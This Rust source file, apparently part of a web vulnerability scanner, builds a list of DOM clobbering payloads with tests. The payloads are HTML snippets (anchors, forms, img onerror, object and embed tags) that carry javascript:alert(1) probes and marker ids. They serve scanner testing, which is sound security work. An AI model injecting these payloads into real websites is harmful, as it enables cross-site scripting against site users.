/// DOM Clobbering payloads that exploit named property access on DOM elements
/// to override global variables and object properties used by application logic.
pub fn get_dom_clobbering_payloads() -> Vec<String> {
    let class_marker = crate::scanning::markers::class_marker();
    let id_marker = crate::scanning::markers::id_marker();

    let templates = [
        // Anchor id/name chain to clobber properties like x.y
        "<a id={ID} name={ID} href=\"javascript:alert(1)\">",
        // Form/input name override to clobber form.action or config vars
        "<form id={ID} class={CLASS}><input name=\"action\" value=\"javascript:alert(1)\"></form>",
        // Anchor chain for nested property access (e.g. config.url)
        "<a id=config class={CLASS}></a><a id=config name=url href=\"javascript:alert(1)\">",
        // Image with id to clobber src-based lookups
        "<img id={ID} name={ID} src=x onerror=alert(1) class={CLASS}>",
        // Object tag clobbering
        "<object id={ID} class={CLASS} data=\"javascript:alert(1)\">",
        // Embed clobbering
        "<embed id={ID} class={CLASS} src=\"javascript:alert(1)\">",
        // Anchor clobbering targeting settings/options patterns
        "<a id=settings class={CLASS}></a><a id=settings name=debug href=\"javascript:alert(1)\">",
        // Form with output to clobber result properties
        "<form id={ID} class={CLASS}><output name=innerHTML>clobbered</output></form>",
    ];

    let mut out = Vec::new();
    for tmpl in templates.iter() {
        let with_class = tmpl.replace("{CLASS}", class_marker);
        let with_id = with_class.replace("{ID}", id_marker);
        out.push(with_id);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_dom_clobbering_payloads_non_empty() {
        let payloads = get_dom_clobbering_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_dom_clobbering_payloads_contains_markers() {
        let payloads = get_dom_clobbering_payloads();
        let cls = crate::scanning::markers::class_marker();
        let idm = crate::scanning::markers::id_marker();
        let has_marker = payloads.iter().any(|p| p.contains(cls) || p.contains(idm));
        assert!(has_marker, "DOM clobbering payloads should contain markers");
    }

    #[test]
    fn test_get_dom_clobbering_payloads_contains_anchor() {
        let payloads = get_dom_clobbering_payloads();
        assert!(
            payloads.iter().any(|p| p.contains("<a ")),
            "should include anchor-based clobbering"
        );
    }

    #[test]
    fn test_get_dom_clobbering_payloads_contains_form() {
        let payloads = get_dom_clobbering_payloads();
        assert!(
            payloads.iter().any(|p| p.contains("<form")),
            "should include form-based clobbering"
        );
    }
}
